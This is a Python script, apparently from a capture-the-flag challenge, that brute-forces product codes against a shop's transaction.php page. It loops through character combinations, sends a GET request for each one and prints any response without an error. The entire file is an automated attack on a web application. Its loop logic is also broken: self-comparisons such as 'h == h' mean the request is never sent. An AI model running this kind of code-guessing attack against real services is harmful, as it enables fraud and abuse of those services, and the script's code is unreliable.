
URL = "http://funshop.cddc19q.ctf.sg/page/transaction.php"#?prod_code="
codes = ["94-04-3QmM-ulP-c0z-k", "W8-31-5053-0kX-QiL-1"]
import requests, time 
fail = """
<!-- ?debug_mode=1 -->
Error: Transaction hash is invalid.
"""
data = "1234567890ASDFGHJKLQWERTYUIOPZXCVBNM"#asdfghjklqwertyuiopzxcvbnm"
def codify(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o):
    return a+b+'-'+c+d+'-'+e+f+g+h+'-'+i+j+k+'-'+l+m+n+'-'+o
    
def failed(a):
    print(a)
    
for a in data:
    for b in data:
        if a == b:continue
        for c in data:
            if a == c or b == c: continue
            for d in data:
                if d==a or d==b or d==c:continue
                for e in data:
                   if e==a or e==b or e==c or e == d:continue
                   for f in data:
                        if f==a or f==b or f==c or f == d or f==e:continue
                        for g in data:
                            if g==a or g==b or g==c or g == d or g==e or g==f:continue
                            for h in data:
                                if h == a or h == b or h == c or h == d or h == e or h == f or h == g or h == h: continue
                                for i in data:
                                    if i == a or i == b or i == c or i == d or i == e or i == f or i == g or i == h or i == i: continue
                                    for j in data:
                                        if j == a or j == b or j == c or j == d or j == e or j == f or j == g or j == h or j == i or j == j: continue
                                        for k in data:
                                            if k == a or k == b or k == c or k == d or k == e or k == f or k == g or k == h or k == i or k == j or k == k: continue
                                            for l in data:
                                                if l == a or l == b or l == c or l == d or l == e or l == f or l == g or l == h or l == i or l == j or l == k or l == l: continue
                                                for m in data:
                                                    if m == a or m == b or m == c or m == d or m == e or m == f or m == g or m == h or m == i or m == j or m == k or m == l or m == m: continue
                                                    for n in data:

                                                        for o in data:
                                                               
                                                                code = codify(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o)
                                                                print(code)
                                                                retrieved = requests.get(url = URL, params = {'prod_code':code} )
                                                                #print ("Error" in retrieved.text)
                                                                if "Error" not in retrieved.text: 
                                                                    print("##################")
                                                                    print(code)
                                                                    print(retrieved.text)
                                                                    #time.sleep(1)
                                                                    #exit()
